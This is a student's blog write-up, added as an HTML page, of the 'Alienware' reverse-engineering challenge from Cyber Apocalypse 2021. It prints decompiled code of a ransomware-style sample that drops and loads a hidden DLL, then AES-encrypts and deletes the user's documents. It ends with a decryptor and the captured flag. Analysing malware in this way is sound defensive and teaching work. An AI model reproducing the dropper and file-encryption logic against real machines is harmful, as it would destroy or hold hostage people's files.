@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title>My Blog - 2021-04-CyberApocalypse2021 - Alienware</title>
+
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="Abraxus">
+    <!-- FontAwesome JS-->
+    <script defer src="../../assets/js/fontawesome.min.js"></script>
+
+    <!-- Theme CSS -->
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body class="theme-bg-light">
+
+    <header class="header text-center">
+    <h1 class="blog-name pt-lg-4 mb-0"><a class="no-text-decoration" href="index.html">Abraxus's Blog</a></h1>
+
+    <nav class="navbar navbar-expand-lg navbar-dark">
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div id="navigation" class="collapse navbar-collapse flex-column">
+            <div class="profile-section pt-3 pt-lg-0">
+                <img class="profile-image mb-3 rounded-circle mx-auto" src="../../assets/images/profile.png" alt="image">
+
+                <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
+                <ul class="social-list list-inline py-3 mx-auto">
+                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
+                </ul><!--//social-list-->
+                <hr>
+            </div><!--//profile-section-->
+
+            <ul class="navbar-nav flex-column text-center">
+                <li class="nav-item">
+                    <a class="nav-link" href="../../index.html"><i class="fas fa-home fa-fw me-2"></i>Blog Home <i class="fas fa-home fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../about.html"><i class="fas fa-user fa-fw me-2"></i>About Me <i class="fas fa-user fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../blog-posts.html"><i class="fas fa-bookmark fa-fw me-2"></i>Blog Posts <i class="fas fa-bookmark fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../writeups.html"><i class="fas fa-flag fa-fw me-2"></i>Writeups <i class="fas fa-flag fa-fw me-2"></i></a>
+                </li>
+            </ul>
+
+            <div class="my-2 my-md-3 text-center">
+                <a class="btn btn-primary" href="https://github.com/Kasimir123" target="_blank">Get in Touch</a>
+            </div>
+        </div>
+    </nav>
+</header>
+
+    <div class="main-wrapper">
+
+        <article class="markdown-section my-5 mx-5">
+            <h1 id="cyber-apocalypse-2021-alienware-write-up">Cyber Apocalypse 2021 Alienware Write Up</h1>
+<h2 id="details">Details:</h2>
+<p>Points: 350</p>
+<p>Jeopardy style CTF</p>
+<p>Category: Reverse Engineering</p>
+<p>Comments:</p>
+<pre><code>We discovered this tool in the E.T. toolkit which they used to encrypt and exfiltrate files from infected systems. Can you help us recover the files?
+This challenge will raise 43 euros for a good cause.
+</code></pre>
+<h2 id="write-up">Write up:</h2>
+<p>The main function of alienware was:</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+<span style="color:Blue;">int</span> __cdecl main(<span style="color:Blue;">int</span> argc, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **argv, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **envp)
+{
+  <span style="color:Blue;">unsigned</span> __int64 v3;
+  __int64 v5; 
+  __int64 v6;
+  <span style="color:Blue;">char</span> v7; 
+  WCHAR Buffer[1024];
+
+  v5 = 0i64;
+  v6 = 0i64;
+  v7 = 0;
+  memset(Buffer, 0, <span style="color:Blue;">sizeof</span>(Buffer));
+  GetEnvironmentVariableW(L<span style="color:#A31515;">&quot;OS&quot;</span>, Buffer, 0x3FFu);
+  v3 = -1i64;
+  <span style="color:Blue;">do</span>
+    ++v3;
+  <span style="color:Blue;">while</span> ( Buffer[v3] );
+  LOBYTE(v5) = LOBYTE(Buffer[0]) ^ 0x78;
+  BYTE1(v5) = LOBYTE(Buffer[1 % v3]) ^ 2;
+  BYTE2(v5) = LOBYTE(Buffer[2 % v3]) ^ 0x76;
+  BYTE3(v5) = LOBYTE(Buffer[3 % v3]) ^ 0x80;
+  BYTE4(v5) = LOBYTE(Buffer[4 % v3]) ^ 0xF5;
+  BYTE5(v5) = LOBYTE(Buffer[5 % v3]) ^ 0x44;
+  BYTE6(v5) = LOBYTE(Buffer[6 % v3]) ^ 0xAA;
+  HIBYTE(v5) = LOBYTE(Buffer[7 % v3]) ^ 0x98;
+  LOBYTE(v6) = LOBYTE(Buffer[8 % v3]) ^ 0xEE;
+  BYTE1(v6) = LOBYTE(Buffer[9 % v3]) ^ 0x65;
+  BYTE2(v6) = LOBYTE(Buffer[0xA % v3]) ^ 0x11;
+  BYTE3(v6) = LOBYTE(Buffer[0xB % v3]) ^ 0x76;
+  BYTE4(v6) = LOBYTE(Buffer[0xC % v3]) ^ 0x78;
+  BYTE5(v6) = LOBYTE(Buffer[0xD % v3]) ^ 2;
+  BYTE6(v6) = LOBYTE(Buffer[0xE % v3]) ^ 0x76;
+  HIBYTE(v6) = LOBYTE(Buffer[0xF % v3]) ^ 0x80;
+  qword_140005750(&amp;v5);
+  FreeLibrary(hLibModule);
+  DeleteFileA(::Buffer);
+  <span style="color:Blue;">return</span> 0;
+}
+</pre></div>
+</div>
+<p>The program reads the OS environment variable which is &quot;Windows_NT&quot; and then does some operations on that to get a string of size 16. It then passes that string into a function that we cannot see with static analysis.</p>
+<p>I also found a callback function that was run before the main function:</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+<span style="color:Blue;">void</span> TlsCallback_0()
+{
+  HRSRC v0;
+  HGLOBAL v1; 
+  size_t v2; 
+  _BYTE *v3; 
+  <span style="color:Blue;">char</span> *v4; 
+  <span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span> v5; 
+  <span style="color:Blue;">const</span> <span style="color:Blue;">void</span> *v6; 
+  <span style="color:Blue;">char</span> *v7; 
+  <span style="color:Blue;">signed</span> __int64 v8;
+  <span style="color:Blue;">unsigned</span> __int64 v9;
+  FILE *v10; 
+  CHAR Buffer[272];
+
+  <span style="color:Blue;">if</span> ( dword_140005734 != 1 )
+  {
+    v0 = FindResourceW(0i64, (LPCWSTR)0x66, L<span style="color:#A31515;">&quot;BIN&quot;</span>);
+    v1 = LoadResource(0i64, v0);
+    v2 = SizeofResource(0i64, v0);
+    v3 = LockResource(v1);
+    v4 = (<span style="color:Blue;">char</span> *)VirtualAlloc(0i64, (<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)v2, 0x1000u, 4u);
+    v5 = 0;
+    v6 = v4;
+    <span style="color:Blue;">if</span> ( (_DWORD)v2 )
+    {
+      v7 = v4;
+      v8 = v3 - v4;
+      <span style="color:Blue;">do</span>
+      {
+        v9 = (<span style="color:Blue;">int</span>)v5;
+        ++v7;
+        ++v5;
+        *(v7 - 1) = v7[v8 - 1] ^ byte_140003280[v9 % 0xC];
+      }
+      <span style="color:Blue;">while</span> ( v5 &lt; (<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)v2 );
+    }
+    memset(Buffer, 0, 0x104ui64);
+    GetTempPathA(0x104u, Buffer);
+    sub_140001010(::Buffer, <span style="color:#A31515;">&quot;%s%s&quot;</span>);
+    v10 = fopen(::Buffer, <span style="color:#A31515;">&quot;wb&quot;</span>);
+    fwrite(v6, 1ui64, v2, v10);
+    fclose(v10);
+    hLibModule = LoadLibraryA(::Buffer);
+    encryptFiles = (__int64 (__fastcall *)(_QWORD))GetProcAddress(hLibModule, <span style="color:#A31515;">&quot;encryptFiles&quot;</span>);
+    dword_140005734 = 1;
+  }
+}
+</pre></div>
+</div>
+<p>This function writes a file to the operating system and then uses LoadLibraryA to inject the library into the original process. Then it grabs a function from what at this point I was guessing was a dll using GetProcAddress. Doing some more analysis it becomes obvious that the function pointer we get here is what is used in the main function with the string we create. I then extracted the dll and started reversing that.</p>
+<p>I started off by finding the exported function we reference in the main .exe:</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+__int64 __fastcall encryptFiles(<span style="color:Blue;">char</span> *a1)
+{
+  HANDLE v2;
+  DWORD pcbBuffer[4];
+  <span style="color:Blue;">struct</span> _WIN32_FIND_DATAW FindFileData; 
+  WCHAR Buffer[264]; 
+  WCHAR FileName[2048]; 
+  WCHAR v8[2048]; 
+  WCHAR v9[2048]; 
+
+  pcbBuffer[0] = 257;
+  GetUserNameW(Buffer, pcbBuffer);
+  memset(v8, 0, <span style="color:Blue;">sizeof</span>(v8));
+  wsprintfW(v8, L<span style="color:#A31515;">&quot;C:\\Users\\%s\\Docs&quot;</span>, Buffer);
+  wsprintfW(FileName, L<span style="color:#A31515;">&quot;%s\\*.*&quot;</span>, v8);
+  v2 = FindFirstFileW(FileName, &amp;FindFileData);
+  <span style="color:Blue;">if</span> ( v2 != (HANDLE)-1i64 )
+  {
+    <span style="color:Blue;">do</span>
+    {
+      <span style="color:Blue;">if</span> ( (FindFileData.cFileName[0] != 46 || FindFileData.cFileName[1])
+        &amp;&amp; (FindFileData.cFileName[0] != 46 || FindFileData.cFileName[1] != 46 || FindFileData.cFileName[2]) )
+      {
+        wsprintfW(FileName, L<span style="color:#A31515;">&quot;%s\\%s&quot;</span>, v8, FindFileData.cFileName);
+        wsprintfW(v9, L<span style="color:#A31515;">&quot;%s.alien&quot;</span>, FileName, FindFileData.cFileName);
+        <span style="color:Blue;">if</span> ( (FindFileData.dwFileAttributes &amp; 0x10) == 0 )
+        {
+          sub_1800011C0(FileName, v9, a1);
+          wremove(FileName);
+        }
+      }
+    }
+    <span style="color:Blue;">while</span> ( FindNextFileW(v2, &amp;FindFileData) );
+    FindClose(v2);
+  }
+  <span style="color:Blue;">return</span> 0i64;
+}
+</pre></div>
+</div>
+<p>This function seems to go to the path of C:\Users\&lt;current user&gt;\Docs and then loops through and tries to encrypt everything that isn't the . or .. directory. After encrypting it seems to add the .alien component to the file.</p>
+<p>It then calls a function for each file which takes the original file name, the new file name, and the string that we created in the main function of the original exe.</p>
+<p>Opening the true encryption function I see:</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+__int64 __fastcall sub_1800011C0(LPCWSTR lpFileName, LPCWSTR a2, <span style="color:Blue;">char</span> *Source)
+{
+  <span style="color:Blue;">int</span> v5; 
+  HANDLE v6; 
+  HANDLE v7; 
+  DWORD v8; 
+  BOOL v10;
+  <span style="color:Blue;">int</span> v11; 
+  DWORD i; 
+  DWORD NumberOfBytesRead; 
+  HCRYPTPROV phProv; 
+  DWORD NumberOfBytesWritten;
+  HCRYPTHASH phHash; 
+  HCRYPTKEY phKey; 
+  __int64 Buffer; 
+  __int64 v19; 
+  __int64 v20; 
+  __int64 v21; 
+  __int64 v22;
+  __int64 v23; 
+  <span style="color:Blue;">wchar_t</span> Dest[4]; 
+  __int64 v25; 
+  __int64 v26; 
+  __int64 v27; 
+  __int16 v28;
+  WCHAR szProvider[8]; 
+  __int128 v30; 
+  __int128 v31; 
+  __int128 v32; 
+  __int128 v33; 
+  __int128 v34; 
+  __int64 v35; 
+  <span style="color:Blue;">int</span> v36; 
+
+  *(_QWORD *)Dest = 0i64;
+  v25 = 0i64;
+  v26 = 0i64;
+  v27 = 0i64;
+  v28 = 0;
+  mbstowcs(Dest, Source, 0x10ui64);
+  v5 = lstrlenW(Dest);
+  v6 = CreateFileW(lpFileName, 0x80000000, 1u, 0i64, 3u, 0x8000000u, 0i64);
+  <span style="color:Blue;">if</span> ( v6 == (HANDLE)-1i64 )
+    <span style="color:Blue;">return</span> 0xFFFFFFFFi64;
+  v7 = CreateFileW(a2, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
+  <span style="color:Blue;">if</span> ( v7 == (HANDLE)-1i64 )
+    <span style="color:Blue;">return</span> 0xFFFFFFFFi64;
+  *(_OWORD *)szProvider = xmmword_180003290;
+  v31 = xmmword_1800032B0;
+  v30 = xmmword_1800032A0;
+  v33 = xmmword_1800032D0;
+  v32 = xmmword_1800032C0;
+  v35 = 0x65006400690076i64;
+  v34 = xmmword_1800032E0;
+  v36 = 114;
+  <span style="color:Blue;">if</span> ( !CryptAcquireContextW(&amp;phProv, 0i64, szProvider, 0x18u, 0xF0000000)
+    || !CryptCreateHash(phProv, 0x800Cu, 0i64, 0, &amp;phHash) )
+  {
+    <span style="color:Blue;">goto</span> LABEL_4;
+  }
+  <span style="color:Blue;">if</span> ( !CryptHashData(phHash, (<span style="color:Blue;">const</span> BYTE *)Dest, v5, 0) )
+  {
+    GetLastError();
+    <span style="color:Blue;">return</span> 0xFFFFFFFFi64;
+  }
+  <span style="color:Blue;">if</span> ( !CryptDeriveKey(phProv, 0x660Eu, phHash, 0, &amp;phKey) )
+  {
+LABEL_4:
+    v8 = GetLastError();
+    CryptReleaseContext(phProv, 0);
+    <span style="color:Blue;">return</span> v8;
+  }
+  NumberOfBytesRead = 0;
+  Buffer = 0i64;
+  v19 = 0i64;
+  v20 = 0i64;
+  v10 = 0;
+  v21 = 0i64;
+  v11 = 0;
+  v22 = 0i64;
+  v23 = 0i64;
+  <span style="color:Blue;">for</span> ( i = GetFileSize(v6, 0i64); ReadFile(v6, &amp;Buffer, 0x30u, &amp;NumberOfBytesRead, 0i64); v23 = 0i64 )
+  {
+    <span style="color:Blue;">if</span> ( !NumberOfBytesRead )
+      <span style="color:Blue;">break</span>;
+    v11 += NumberOfBytesRead;
+    <span style="color:Blue;">if</span> ( v11 == i )
+      v10 = 1;
+    <span style="color:Blue;">if</span> ( !CryptEncrypt(phKey, 0i64, v10, 0, (BYTE *)&amp;Buffer, &amp;NumberOfBytesRead, 0x30u) )
+      <span style="color:Blue;">break</span>;
+    NumberOfBytesWritten = 0;
+    <span style="color:Blue;">if</span> ( !WriteFile(v7, &amp;Buffer, NumberOfBytesRead, &amp;NumberOfBytesWritten, 0i64) )
+      <span style="color:Blue;">break</span>;
+    Buffer = 0i64;
+    v19 = 0i64;
+    v20 = 0i64;
+    v21 = 0i64;
+    v22 = 0i64;
+  }
+  CryptReleaseContext(phProv, 0);
+  CryptDestroyKey(phKey);
+  CryptDestroyHash(phHash);
+  CloseHandle(v6);
+  CloseHandle(v7);
+  <span style="color:Blue;">return</span> 1i64;
+}
+</pre></div>
+</div>
+<p>Looking through this function we can see that they open the original file and the file they want to write to. They then acquire lots of things needed for crypt, using the string we passed from main for CryptHashData. They then derive the key from that. They then encrypt the data a block at a time while writing the file. Then they release all the memory and exit.</p>
+<p>Looking through MSDN I found out that as long as I had the original string as well as the cryptographic provider. I saw that the provider was being instantiated using some xmmword so I look at what they were:</p>
+<pre><code>.rdata:0000000180003290 xmmword_180003290 xmmword 66006F0073006F007200630069004Dh
+.rdata:00000001800032A0 xmmword_1800032A0 xmmword 63006E00610068006E004500200074h
+.rdata:00000001800032B0 xmmword_1800032B0 xmmword 610020004100530052002000640065h   
+.rdata:00000001800032C0 xmmword_1800032C0 xmmword 43002000530045004100200064006Eh
+.rdata:00000001800032D0 xmmword_1800032D0 xmmword 6100720067006F0074007000790072h
+.rdata:00000001800032E0 xmmword_1800032E0 xmmword 6F0072005000200063006900680070h
+.rdata:00000001800032F0 qword_1800032F0 dq 65006400690076h 
+.rdata:00000001800032F8 dword_1800032F8 dd 72h
+</code></pre>
+<p>Turning the hex into ascii I saw that it used:</p>
+<pre><code>Microsoft Enhanced RSA and AES Cryptographic Provider
+</code></pre>
+<p>I then wrote the following c++ program:</p>
+<div class="lang-c++ editor-colors"><div style="color:Black;background-color:White;"><pre>
+#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;WinBase.h&gt;
+#include &lt;wincrypt.h&gt;
+
+#pragma comment (lib, <span style="color:#A31515;">&quot;advapi32&quot;</span>)
+
+
+<span style="color:Blue;">int</span> main()
+{
+    <span style="color:Green;">// Declarations</span>
+    HCRYPTPROV phProv;
+    DWORD NumberOfBytesRead = 0;
+    DWORD NumberOfBytesWritten = 0;
+    HCRYPTHASH phHash;
+    HCRYPTKEY phKey;
+    BYTE Buffer[1024] = { 0 };
+    <span style="color:Blue;">int</span> v11 = 0;
+    <span style="color:Blue;">int</span> v10 = 0;
+    <span style="color:Blue;">int</span> v5;
+    HANDLE v6;
+    HANDLE v7;
+
+    <span style="color:Green;">// Set size of crypt string</span>
+    v5 = 0x10u;
+
+    <span style="color:Green;">// Acquire context</span>
+    <span style="color:Blue;">if</span> (!CryptAcquireContextW(&amp;phProv, 0, L<span style="color:#A31515;">&quot;Microsoft Enhanced RSA and AES Cryptographic Provider&quot;</span>, 24, 0xF0000000)) exit(1);
+
+    <span style="color:Green;">// Create the hash</span>
+    <span style="color:Blue;">if</span> (!CryptCreateHash(phProv, 0x800Cu, 0, 0, &amp;phHash)) exit(1);
+
+    <span style="color:Green;">// Create the hash data using string derived from main function</span>
+    <span style="color:Blue;">if</span> (!CryptHashData(phHash, (<span style="color:Blue;">const</span> BYTE*)<span style="color:#A31515;">&quot;\x2F\x00\x6B\x00\x18\x00\xE4\x00\x9A\x00\x33\x00\xD9\x00\xC7\x00\xA0\x00\x31\x00\x46\x00\x1F\x00\x16\x00\x66\x00\x19\x00\xF7\x00&quot;</span>, v5, 0)) exit(1);
+
+    <span style="color:Green;">// Derive key from hash</span>
+    <span style="color:Blue;">if</span> (!CryptDeriveKey(phProv, 0x660Eu, phHash, 0, &amp;phKey)) exit(1);
+
+    <span style="color:Green;">// Open encrypted file</span>
+    v6 = CreateFileW(L<span style="color:#A31515;">&quot;Confidential.pdf.alien&quot;</span>, 0x80000000, 1, 0, 3, (<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)0x80000000, 0);
+
+    <span style="color:Green;">// Open file to write to</span>
+    v7 = CreateFileW(L<span style="color:#A31515;">&quot;Confidential.pdf&quot;</span>, (<span style="color:Blue;">unsigned</span> <span style="color:Blue;">int</span>)0x40000000, 0, 0, 2, 0x80, 0);
+
+    <span style="color:Green;">// Loop through the file in chunks</span>
+    <span style="color:Blue;">for</span> (DWORD i = GetFileSize(v6, 0); ReadFile(v6, Buffer, 0x30u, &amp;NumberOfBytesRead, 0);)
+    {
+        <span style="color:Green;">// if no bytes are read then break</span>
+        <span style="color:Blue;">if</span> (!NumberOfBytesRead) <span style="color:Blue;">break</span>;
+
+        <span style="color:Green;">// append number of bytes read to total count</span>
+        v11 += NumberOfBytesRead;
+
+        <span style="color:Green;">// if all bytes are read then set final to true, from MSDN docs</span>
+        <span style="color:Blue;">if</span> (v11 == i) v10 = 1;
+
+        <span style="color:Green;">// Decrypt the block</span>
+        CryptDecrypt(phKey, 0, v10, 0, (BYTE*)Buffer, &amp;NumberOfBytesRead);
+
+        <span style="color:Green;">// empty out bytes</span>
+        NumberOfBytesWritten = 0;
+
+        <span style="color:Green;">// write file</span>
+        WriteFile(v7, Buffer, NumberOfBytesRead, &amp;NumberOfBytesWritten, 0);
+
+        <span style="color:Green;">// clear buffer</span>
+        ZeroMemory(&amp;Buffer, <span style="color:Blue;">sizeof</span>(Buffer));
+
+    }
+
+    <span style="color:Green;">// release all memory</span>
+    CryptReleaseContext(phProv, 0);
+    CryptDestroyKey(phKey);
+    CryptDestroyHash(phHash);
+    CloseHandle(v6);
+    CloseHandle(v7);
+
+}
+</pre></div>
+</div>
+<p>When run I got the decrypted pdf which contained the flag:</p>
+<pre><code>CHTB{3nh4nc3d_al1en_m@lwar3!}
+</code></pre>
+
+        </article>
+
+        <footer class="footer text-left py-2 theme-bg-dark">
+
+    <small class="copyright">&nbsp;Generated by <a href="https://github.com/Kasimir123/Blog-Generator" target="_blank">Blog Generator</a> from Kasimir123</small>
+
+</footer>
+
+    </div><!--//main-wrapper-->
+    <!-- Javascript -->
+    <script src="../../assets/js/popper.min.js"></script>
+    <script src="../../assets/js/bootstrap.min.js"></script>
+</body>
+</html>
